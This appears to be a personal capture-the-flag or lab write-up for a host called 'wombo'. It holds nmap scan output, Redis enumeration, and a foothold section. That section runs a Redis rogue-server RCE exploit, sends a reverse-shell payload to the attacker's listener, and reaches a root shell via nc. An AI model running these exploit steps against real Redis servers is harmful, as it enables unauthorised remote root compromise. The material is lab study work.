## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.124.69
# HOSTNAME
wombo
# OPERATING SYSTEM

# CREDENTIALS  

```
## OPEN PORTS DETAILS
```bash
22/tcp    open   ssh        syn-ack ttl 61 OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
80/tcp    open   http       syn-ack ttl 61 nginx 1.10.3
6379/tcp  open   redis      syn-ack ttl 61 Redis key-value store 5.0.9
8080/tcp  open   http-proxy syn-ack ttl 61
27017/tcp open   mongodb    syn-ack ttl 61 MongoDB 4.0.18
```
# ENUMERATION
## PORT 6379
```bash
# Nmap
- 6379/tcp  open   redis      syn-ack ttl 61 Redis key-value store 5.0.9
sudo redis-cli -h $ip                                                                                                                                                     192.168.124.69:6379> INFO                                                                                                                                                 # Server                                                                                                                                                                  
redis_version:5.0.9      


# Found exploit 
- Redis rouge server
Redis 4.x / 5.x - Unauthenticated Code Execution (Metasploit)| linux/remote/47195.rb

- Check for Exploit on github
```
## FOOTHOLD
```bash
- Exploits Reference
	- https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
	- https://github.com/Ridter/redis-rce

- Since the module exp.so was unable to compile 
- Made a fork of exploits. Aggregared the exploits and created a working redis-rouge-server-rce

- https://github.com/binaryxploit/redis-rouge-server-rce

sudo python3 redis-rce.py -r 192.168.121.69 -L 192.168.45.221 -P 8080 -f ../redis-module-load-cmd-exec/module.so
[sudo] password for kali: 

█▄▄▄▄ ▄███▄   ██▄   ▄█    ▄▄▄▄▄       █▄▄▄▄ ▄█▄    ▄███▄   
█  ▄▀ █▀   ▀  █  █  ██   █     ▀▄     █  ▄▀ █▀ ▀▄  █▀   ▀  
█▀▀▌  ██▄▄    █   █ ██ ▄  ▀▀▀▀▄       █▀▀▌  █   ▀  ██▄▄    
█  █  █▄   ▄▀ █  █  ▐█  ▀▄▄▄▄▀        █  █  █▄  ▄▀ █▄   ▄▀ 
  █   ▀███▀   ███▀   ▐                  █   ▀███▀  ▀███▀   
 ▀                                     ▀                    

[*] Connecting to  192.168.121.69:6379...
[*] Sending SLAVEOF command to server
[+] Accepted connection from 192.168.121.69:6379
[*] Setting filename
[+] Accepted connection from 192.168.121.69:6379
[*] Start listening on 192.168.45.221:8080
[*] Tring to run payload
[+] Accepted connection from 192.168.121.69:37233
[*] Closing rogue server...

[+] What do u want ? [i]nteractive shell or [r]everse shell or [e]xit: r
[*] Open reverse shell...
[*] Reverse server address: 192.168.45.221
[*] Reverse server port: 8080
[+] Reverse shell payload sent.
[*] Check at 192.168.45.221:8080
[*] Clean up..

- Listener 
sudo nc -nvlp 8080
listening on [any] 8080 ...
connect to [192.168.45.221] from (UNKNOWN) [192.168.121.69] 48032
id
uid=0(root) gid=0(root) groups=0(root)

# root
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.94SVN scan initiated Tue Dec  3 13:39:55 2024 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.124.69
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.1 \d\d\d (?:[^\r\n]*\r\n(?!\r\n))*?.*\r\nServer: Virata-EmWeb/R([\d_]+)\r\nContent-Type: text/html; ?charset=UTF-8\r\nExpires: .*<title>HP (Color |)LaserJet ([\w._ -]+)&nbsp;&nbsp;&nbsp;'
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service upnp with the regex '^HTTP/1\.1 \d\d\d (?:[^\r\n]*\r\n(?!\r\n))*?.*SERVER: Linux/([\w._+-]+), UPnP/([\d.]+), Intel UPnP SDK/([\w._~-]+)\r\n'
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.1 \d\d\d (?:[^\r\n]*\r\n(?!\r\n))*?.*\r\nServer: Virata-EmWeb/R([\d_]+)\r\nContent-Type: text/html; ?charset=UTF-8\r\nExpires: .*<title>HP (Color |)LaserJet ([\w._ -]+)&nbsp;&nbsp;&nbsp;'
Nmap scan report for 192.168.124.69
Host is up, received echo-reply ttl 61 (0.036s latency).
Scanned at 2024-12-03 13:39:57 IST for 166s
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE  SERVICE    REASON         VERSION
22/tcp    open   ssh        syn-ack ttl 61 OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 09:80:39:ef:3f:61:a8:d9:e6:fb:04:94:23:c9:ef:a8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGBXRhQCez7/IOdnHzLYdpVtWWRMN/7bUR/C3T/W6V9DwlKUS2AfdncLdLwqnx61jODFdXDrTdEdTAtK4MHuXt/UOLDXr1SOfUHYQbZd1rmpMaeB3qOKfoVP7NMp2Ga68kT/9NvBphakYXRWw4C7RS0N+4YWU/BjSyMTIdnhJX05lC5Uyljg7FliJ7d3J/CtF98I6Oo5u/Eb2/5BB45/1IuM6R7BGCDOpIs6po1FyEk8gFktbB+INGATdBPxvmAOX6G7m/R491a9/QtaF8wrgsjS3fQftoiW8vwcaom8Bmu94xZ9pZq0Dgt9VWQz241T5dGQrp57s6Djl/V83/qGFP
|   256 83:f8:6f:50:7a:62:05:aa:15:44:10:f5:4a:c2:f5:a6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLg0oQ1t4NCz+KWPtrCjgDf+qjW2Vb4oOc/eM21vT9rIPJa//rO0LFT8czDxcWFU9HMSEohfSm8emC4lShgGrY4=
|   256 1e:2b:13:30:5c:f1:31:15:b4:e8:f3:d2:c4:e8:05:b5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPS81xs7EU6k92rNFdmsDF7qcRDxDILJUeva18aKW1GV
53/tcp    closed domain     reset ttl 61
80/tcp    open   http       syn-ack ttl 61 nginx 1.10.3
|_http-server-header: nginx/1.10.3
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Welcome to nginx!
6379/tcp  open   redis      syn-ack ttl 61 Redis key-value store 5.0.9
8080/tcp  open   http-proxy syn-ack ttl 61
|_http-title: Home | NodeBB
| http-robots.txt: 3 disallowed entries 
|_/admin/ /reset/ /compose
|_http-favicon: Unknown favicon MD5: 152FF7D5AE5BDB84B33D4DCA31EB7CD3
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     set-cookie: _csrf=OMpuDRlyh7ujF2kaOaslcODU; Path=/
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 11098
|     ETag: W/"2b5a-pTHbz6HGgUyszdEbK/tlm1UpgP0"
|     Vary: Accept-Encoding
|     Date: Tue, 03 Dec 2024 08:11:47 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en-GB" data-dir="ltr" style="direction: ltr;" >
|     <head>
|     <title>Not Found | NodeBB</title>
|     <meta name="viewport" content="width&#x3D;device-width, initial-scale&#x3D;1.0" />
|     <meta name="content-type" content="text/html; charset=UTF-8" />
|     <meta name="apple-mobile-web-app-capable" content="yes" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta property="og:site_n
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     set-cookie: _csrf=njkkQSLMr_s9dki4wmdm0sEy; Path=/
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 18181
|     ETag: W/"4705-ZimASi9Y2g5RipYVvHvhY8JHfcQ"
|     Vary: Accept-Encoding
|     Date: Tue, 03 Dec 2024 08:11:47 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en-GB" data-dir="ltr" style="direction: ltr;" >
|     <head>
|     <title>Home | NodeBB</title>
|     <meta name="viewport" content="width&#x3D;device-width, initial-scale&#x3D;1.0" />
|     <meta name="content-type" content="text/html; charset=UTF-8" />
|     <meta name="apple-mobile-web-app-capable" content="yes" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta property="og:site_name" content
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     Allow: GET,HEAD
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 8
|     ETag: W/"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg"
|     Vary: Accept-Encoding
|     Date: Tue, 03 Dec 2024 08:11:47 GMT
|     Connection: close
|     GET,HEAD
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
27017/tcp open   mongodb    syn-ack ttl 61 MongoDB 4.0.18
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.0 200 OK
|     Connection: close
|     Content-Type: text/plain
|     Content-Length: 85
|     looks like you are trying to access MongoDB over HTTP on the native driver port.
|   mongodb: 
|     errmsg
|     command serverStatus requires authentication
|     code
|     codeName
|_    Unauthorized
| mongodb-info: 
|   MongoDB Build info
|     sysInfo = deprecated
|     modules
|     ok = 1.0
|     maxBsonObjectSize = 16777216
|     debug = false
|     storageEngines
|       0 = devnull
|       1 = ephemeralForTest
|       2 = mmapv1
|       3 = wiredTiger
|     bits = 64
|     version = 4.0.18
|     buildEnvironment
|       distarch = x86_64
|       cc = /opt/mongodbtoolchain/v2/bin/gcc: gcc (GCC) 5.4.0
|       ccflags = -fno-omit-frame-pointer -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -Werror -O2 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-but-set-variable -Wno-missing-braces -fstack-protector-strong -fno-builtin-memcmp
|       linkflags = -pthread -Wl,-z,now -rdynamic -Wl,--fatal-warnings -fstack-protector-strong -fuse-ld=gold -Wl,--build-id -Wl,--hash-style=gnu -Wl,-z,noexecstack -Wl,--warn-execstack -Wl,-z,relro
|       cxxflags = -Woverloaded-virtual -Wno-maybe-uninitialized -std=c++14
|       distmod = debian92
|       target_arch = x86_64
|       target_os = linux
|       cxx = /opt/mongodbtoolchain/v2/bin/g++: g++ (GCC) 5.4.0
|     versionArray
|       0 = 4
|       1 = 0
|       2 = 18
|       3 = 0
|     gitVersion = 6883bdfb8b8cff32176b1fd176df04da9165fd67
|     javascriptEngine = mozjs
|     openssl
|       running = OpenSSL 1.1.0l  10 Sep 2019
|       compiled = OpenSSL 1.1.0l  10 Sep 2019
|     allocator = tcmalloc
|   Server status
|     code = 13
|     codeName = Unauthorized
|     ok = 0.0
|_    errmsg = command serverStatus requires authentication
| mongodb-databases: 
|   code = 13
|   codeName = Unauthorized
|   ok = 0.0
|_  errmsg = command listDatabases requires authentication
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=12/3%Time=674EBD44%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,3638,"HTTP/1\.1\x20200\x20OK\r\nX-DNS-Prefetch-Control:\x20
SF:off\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Download-Options:\x20noopen\
SF:r\nX-Content-Type-Options:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mod
SF:e=block\r\nReferrer-Policy:\x20strict-origin-when-cross-origin\r\nX-Pow
SF:ered-By:\x20NodeBB\r\nset-cookie:\x20_csrf=njkkQSLMr_s9dki4wmdm0sEy;\x2
SF:0Path=/\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Leng
SF:th:\x2018181\r\nETag:\x20W/\"4705-ZimASi9Y2g5RipYVvHvhY8JHfcQ\"\r\nVary
SF::\x20Accept-Encoding\r\nDate:\x20Tue,\x2003\x20Dec\x202024\x2008:11:47\
SF:x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\r\n<html\x20la
SF:ng=\"en-GB\"\x20data-dir=\"ltr\"\x20style=\"direction:\x20ltr;\"\x20\x2
SF:0>\r\n<head>\r\n\t<title>Home\x20\|\x20NodeBB</title>\r\n\t<meta\x20nam
SF:e=\"viewport\"\x20content=\"width&#x3D;device-width,\x20initial-scale&#
SF:x3D;1\.0\"\x20/>\n\t<meta\x20name=\"content-type\"\x20content=\"text/ht
SF:ml;\x20charset=UTF-8\"\x20/>\n\t<meta\x20name=\"apple-mobile-web-app-ca
SF:pable\"\x20content=\"yes\"\x20/>\n\t<meta\x20name=\"mobile-web-app-capa
SF:ble\"\x20content=\"yes\"\x20/>\n\t<meta\x20property=\"og:site_name\"\x2
SF:0content")%r(HTTPOptions,1BF,"HTTP/1\.1\x20200\x20OK\r\nX-DNS-Prefetch-
SF:Control:\x20off\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Download-Options
SF::\x20noopen\r\nX-Content-Type-Options:\x20nosniff\r\nX-XSS-Protection:\
SF:x201;\x20mode=block\r\nReferrer-Policy:\x20strict-origin-when-cross-ori
SF:gin\r\nX-Powered-By:\x20NodeBB\r\nAllow:\x20GET,HEAD\r\nContent-Type:\x
SF:20text/html;\x20charset=utf-8\r\nContent-Length:\x208\r\nETag:\x20W/\"8
SF:-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg\"\r\nVary:\x20Accept-Encoding\r\nDate:\x20
SF:Tue,\x2003\x20Dec\x202024\x2008:11:47\x20GMT\r\nConnection:\x20close\r\
SF:n\r\nGET,HEAD")%r(RTSPRequest,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\n\r\n")%r(FourOhFourRequest,2D42,"HTTP/1\.1\x20
SF:404\x20Not\x20Found\r\nX-DNS-Prefetch-Control:\x20off\r\nX-Frame-Option
SF:s:\x20SAMEORIGIN\r\nX-Download-Options:\x20noopen\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nReferrer-P
SF:olicy:\x20strict-origin-when-cross-origin\r\nX-Powered-By:\x20NodeBB\r\
SF:nset-cookie:\x20_csrf=OMpuDRlyh7ujF2kaOaslcODU;\x20Path=/\r\nContent-Ty
SF:pe:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2011098\r\nETag:
SF:\x20W/\"2b5a-pTHbz6HGgUyszdEbK/tlm1UpgP0\"\r\nVary:\x20Accept-Encoding\
SF:r\nDate:\x20Tue,\x2003\x20Dec\x202024\x2008:11:47\x20GMT\r\nConnection:
SF:\x20close\r\n\r\n<!DOCTYPE\x20html>\r\n<html\x20lang=\"en-GB\"\x20data-
SF:dir=\"ltr\"\x20style=\"direction:\x20ltr;\"\x20\x20>\r\n<head>\r\n\t<ti
SF:tle>Not\x20Found\x20\|\x20NodeBB</title>\r\n\t<meta\x20name=\"viewport\
SF:"\x20content=\"width&#x3D;device-width,\x20initial-scale&#x3D;1\.0\"\x2
SF:0/>\n\t<meta\x20name=\"content-type\"\x20content=\"text/html;\x20charse
SF:t=UTF-8\"\x20/>\n\t<meta\x20name=\"apple-mobile-web-app-capable\"\x20co
SF:ntent=\"yes\"\x20/>\n\t<meta\x20name=\"mobile-web-app-capable\"\x20cont
SF:ent=\"yes\"\x20/>\n\t<meta\x20property=\"og:site_n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec  3 13:42:43 2024 -- 1 IP address (1 host up) scanned in 168.20 seconds

```

